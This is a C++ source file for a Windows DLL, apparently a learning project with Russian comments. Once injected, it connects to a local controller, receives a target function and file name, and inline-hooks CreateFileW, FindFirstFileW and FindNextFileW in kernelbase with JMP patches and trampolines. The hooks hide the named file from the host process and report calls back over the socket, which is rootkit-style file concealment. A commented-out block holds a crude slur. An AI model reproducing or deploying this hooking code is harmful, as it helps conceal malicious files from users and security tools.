// dllmain.cpp : Определяет точку входа для приложения DLL.



#define WIN32_LEAN_AND_MEAN
#include "framework.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <chrono>
#include <ctime>
#include <format>
#include <string>
#include <thread>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#define MAGIC 14
#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

using namespace std;

char func_name[256] = "";
char file_name[256] = "";
SOCKET ConnectSocket = INVALID_SOCKET;

BYTE CreateOrigBytes[MAGIC];
BYTE FirstOrigBytes[MAGIC];
BYTE NextOrigBytes[MAGIC];

BYTE bytesCreate[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};
BYTE bytesFirst[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};
BYTE bytesNext[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};

void* pOriginalWithTrampoline;

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}

int connect_to_server()
{

    FILE* file2;
    fopen_s(&file2, "C:/Users/magar/Desktop/1000101/client_log.txt", "w");

    WSADATA wsaData;
    //SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        fprintf(file2, "WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            fprintf(file2, "socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET) {
        fprintf(file2, "Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }



    char recv_buff[514] = "";
    iResult = recv(ConnectSocket, recv_buff, _countof(recv_buff), 0);

    int i = 0;
    while (recv_buff[i] != '-') {
        func_name[i] = recv_buff[i];
        i++;
    }
    func_name[i] = 0;
    i++;
    int j = 0;
    while (recv_buff[i + j] != 0) {
        file_name[j] = recv_buff[i + j];
        j++;
    }
    file_name[j] = 0;



    return 0;

}

size_t GetInstructionLength(BYTE* address, size_t minSize) {
    size_t offset = 0;

    while (offset < minSize) {
        BYTE* cur = address + offset;

        // --- Инструкции с REX префиксом (0x48 или 0x4C) ---
        if (cur[0] == 0x48 || cur[0] == 0x4C || cur[0] == 0x41) {
            // mov rax, rsp (48 8B C4) или push r14 (41 56)
            if (cur[1] == 0x8B || cur[1] == 0x89) {
                // Если есть смещение (как [rax+08]), это 4 байта, если нет (как c4) - 3 байта
                if (cur[2] >= 0x40 && cur[2] <= 0x7F) offset += 4; // со смещением 1 байт
                else offset += 3;
            }
            else if (cur[1] >= 0x50 && cur[1] <= 0x5F) offset += 2; // push/pop r8-r15
            else if (cur[1] == 0x83) offset += 4; // sub rsp, xx
            else offset += 3; // дефолт для REX
        }
        // --- Однобайтовые инструкции ---
        else if (cur[0] >= 0x50 && cur[0] <= 0x5F) { // push/pop (rax-rdi)
            offset += 1;
        }
        else if (cur[0] == 0xCC) { // int 3 
            offset += 1;
        }
        // --- Двубайтовые (например, короткие переходы или mov) ---
        else if (cur[0] == 0x8B || cur[0] == 0x89) {
            offset += 2;
        }
        else if (cur[0] == 0xE9) { // jmp rel32
            offset += 5;
        }
        else {
            // Если совсем непонятно, идем по 1 байту
            // В идеале тут нужен полноценный дизассемблер, но для прологов этого хватит
            offset += 1;
        }
    }
    return offset;
}



/*
void* CreateTrampoline(void* const targetAddress, const size_t size) {

    //const auto jumpBack{ CreateJumpBytes(reinterpret_cast<unsigned char*>(targetAddress) + size) };
    const auto jumpBack = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    const auto trampolineStub{ VirtualAlloc(nullptr, size + jumpBack.size(),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    if (trampolineStub == nullptr) {
        send(ConnectSocket, "Error: VirtualAlloc", 50, 0);
    }

    std::memcpy(trampolineStub, targetAddress, size);
    std::memcpy(&reinterpret_cast<unsigned char*>(trampolineStub)[size],
        jumpBack.data(), jumpBack.size());

    return trampolineStub;
}
*/
void* CreateTrampoline(void* targetAddress, int size) {
    // 1. Вычисляем адрес, куда трамплин должен прыгнуть обратно (адрес оригинала + смещение)
    void* returnAddress = (unsigned char*)targetAddress + size;

    // 2. Наш массив-шаблон
    BYTE jumpBack[14] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    // 3. Записываем адрес возврата в массив (с 6-го байта)
    memcpy(&jumpBack[6], &returnAddress, sizeof(void*));

    // 4. Выделяем память под трамплин (разрядность инструкций + наш прыжок)
    void* trampolineStub = VirtualAlloc(nullptr, size + 14, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 5. Копируем "голову" оригинальной функции
    memcpy(trampolineStub, targetAddress, size);

    // 6. Дописываем наш прыжок в конец трамплина
    memcpy((unsigned char*)trampolineStub + size, jumpBack, 14);

    return trampolineStub;
}

typedef HANDLE(WINAPI* CreateFileW_t)(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
    DWORD, DWORD, HANDLE
    );
HANDLE MyCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {

    char notification[] = "Called function: CreateFileW\n";
    send(ConnectSocket, notification, strlen(notification) + 1, 0);
    // 2. СКРЫВАЕМ ФАЙЛ ЕСЛИ НАДО
    LPCWSTR FileToHide = convertCharArrayToLPCWSTR(file_name);
    if (wcsstr(lpFileName, FileToHide)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
    }
    return ((CreateFileW_t)pOriginalWithTrampoline)(lpFileName, dwDesiredAccess, dwShareMode,
        lpSecurityAttributes, dwCreationDisposition,
        dwFlagsAndAttributes, hTemplateFile);
}

typedef HANDLE(WINAPI* FindFirstFileW_t)(LPCWSTR, LPWIN32_FIND_DATAW);
HANDLE MyFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {

    // 1. ОТПРАВЛЯЕМ ДАННЫЕ О ТОМ, ЧТО ФУНКЦИЯ ВЫЗВАНА
    char notification[] = "Called function: FindFirstFileW\n";
    send(ConnectSocket, notification, strlen(notification) + 1, 0);

    // 2. СКРЫВАЕМ ФАЙЛ ЕСЛИ НАДО
    LPCWSTR FileToHide = convertCharArrayToLPCWSTR(file_name);
    if (wcsstr(lpFileName, FileToHide)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
    }

    return ((FindFirstFileW_t)pOriginalWithTrampoline)(lpFileName, lpFindFileData);
}

typedef HANDLE(WINAPI* FindNextFileW_t)(HANDLE, LPWIN32_FIND_DATAW);
BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
    // 1. Логируем вызов
    send(ConnectSocket, "Called function: FindNextFileW\n", 31, 0);

    // 2. Вызываем оригинал ЧЕРЕЗ ТРАМПЛИН (хук снимать не нужно!)
    BOOL result = (BOOL)((FindNextFileW_t)pOriginalWithTrampoline)(hFindFile, lpFindFileData);

    // 3. Проверяем имя файла
    wchar_t* target = convertCharArrayToLPCWSTR(file_name);

    // Используем цикл while вместо if. 
    // Это нужно на случай, если в папке лежат ДВА скрываемых файла подряд.
    while (result && wcsstr(lpFindFileData->cFileName, target)) {
        send(ConnectSocket, "File hidden!\n", 14, 0);

        // Снова вызываем оригинал через трамплин, чтобы получить СЛЕДУЮЩИЙ файл
        result = (BOOL)((FindNextFileW_t)pOriginalWithTrampoline)(hFindFile, lpFindFileData);
    }

    delete[] target; // Не забываем чистить память за convertCharArrayToLPCWSTR
    return result;
}


// 1 Объявляем внешнюю функцию из .asm
extern "C" void callLogger();

// 2 Объявляем переменные, которые ждет .asm 
extern "C" void* hookPtr = nullptr; // адрес трамплина

// 3 функция-логгер на C++
extern "C" void Logger() {
    send(ConnectSocket, "Generic function call detected!\n", 40, 0);
}
// 4. В InstallHook подставляем callLogger вместо MyCreateFileW
int InstallHookGeneric(const char* funcName) {
    DWORD oldProtect;
    HMODULE hKernel32 = GetModuleHandle(L"kernelbase.dll");
    void* FuncAddr = (void*)GetProcAddress(hKernel32, funcName);

    // Создаем трамплин
    size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
    hookPtr = CreateTrampoline(FuncAddr, (int)actualSize);

    // Теперь затираем оригинал прыжком на наш ассемблерный callLogger
    *(void**)(&bytesCreate[6]) = (void*)callLogger;
    VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(FuncAddr, bytesCreate, MAGIC);
    for (size_t i = MAGIC; i < actualSize; i++) {
        ((BYTE*)FuncAddr)[i] = 0x90; // NOP
    }
    VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
    return 0;
}

int InstallHook(const char func[256]) {
    HMODULE hKernel32 = GetModuleHandle(L"kernelbase.dll");
    void* FuncAddr = (void*)GetProcAddress(hKernel32, func);
    if (!FuncAddr) return 0;
    DWORD oldProtect;

    if (!strcmp("CreateFileW", func)) {
        // 1. Считаем, сколько байт НУЖНО забрать, чтобы не разрезать инструкции
        // Мы затираем 14 байт (MAGIC), значит и искать надо минимум 14!
        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);

        // 2. Создаем трамплин на это количество байт
        pOriginalWithTrampoline = CreateTrampoline(FuncAddr, (int)actualSize);

        // 3. Подготавливаем JMP (он всегда 14 байт)
        *(void**)(&bytesCreate[6]) = (void*)MyCreateFileW;

        // 4. Разрешаем запись на ВСЮ длину, которую мы затронем (actualSize)
        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

        // 5. Затираем начало. 
        // ВАЖНО: Если actualSize > 14, оставшиеся байты желательно забить NOP (0x90), 
        // чтобы там не осталось "хвостов" старых инструкций.
        memcpy(FuncAddr, bytesCreate, MAGIC);
        for (size_t i = MAGIC; i < actualSize; i++) {
            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
        }
        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
    }

    else if (!strcmp("FindFirstFileW", func)) {
        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
        pOriginalWithTrampoline = CreateTrampoline(FuncAddr, (int)actualSize);
        *(void**)(&bytesFirst[6]) = (void*)MyFindFirstFileW;
        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesFirst, MAGIC);
        for (size_t i = MAGIC; i < actualSize; i++) {
            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
        }
        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
    }
    else if (!strcmp("FindNextFileW", func)) {
        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
        pOriginalWithTrampoline = CreateTrampoline(FuncAddr, (int)actualSize);
        *(void**)(&bytesNext[6]) = (void*)MyFindNextFileW;
        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesNext, MAGIC);
        for (size_t i = MAGIC; i < actualSize; i++) {
            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
        }
        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
    }


    
    return 1;
}


/*
int InstallHook(const char func[256]) {

    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    void* FuncAddr;
    DWORD oldProtect;

    if (!strcmp("CreateFileW", func)) {
        // получаем адрес
        FuncAddr = (void*)GetProcAddress(hKernel32, func);
        // сохраняем старые байты
        memcpy(CreateOrigBytes, FuncAddr, MAGIC);

        pOriginalWithTrampoline = CreateTrampoline(FuncAddr, GetInstructionLength((BYTE*)FuncAddr, 12));


        // подменяем начало функции
        *(void**)(&bytesCreate[6]) = (void*)MyCreateFileW;
        // разрешаем запись в адресное пространство функции
        VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
        // Перезаписываем начало функции нашим JMP-шаблоном
        memcpy(FuncAddr, bytesCreate, MAGIC);
        // Возвращаем права памяти как было
        VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);

    }

    // повторения действий выше, но для других функций
    if (!strcmp("FindFirstFileW", func)) {
        FuncAddr = (void*)GetProcAddress(hKernel32, func);
        memcpy(FirstOrigBytes, FuncAddr, MAGIC);
        *(void**)(&bytesFirst[6]) = (void*)MyFindFirstFileW;
        VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesFirst, MAGIC);
        VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
    }
    if (!strcmp("FindNextFileW", func)) {
        FuncAddr = (void*)GetProcAddress(hKernel32, func);
        memcpy(NextOrigBytes, FuncAddr, MAGIC);
        *(void**)(&bytesNext[6]) = (void*)MyFindNextFileW;
        VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesNext, MAGIC);
        VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
    }

    return 1;
}
*/

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  reason, LPVOID lpReserved)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH: {
        //52
        Sleep(3000);
        connect_to_server();

        //InstallHook(func_name);
        //InstallHook("FindFirstFileW");
        //InstallHook("FindNextFileW");
        send(ConnectSocket, func_name, strlen(func_name) + 1, 0);
        InstallHookGeneric(func_name);
        
        //InstallHookGeneric("CreateFileW");

        /*
        FILE* file2;
        fopen_s(&file2, "C:/Users/magar/Desktop/1000101/popka.txt", "w");
        fprintf(file2, "hello niggazz11");
        fprintf(file2, "%s\n", func_name);
        fprintf(file2, "%s\n", file_name);
        fclose(file2);
        */

        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;

}

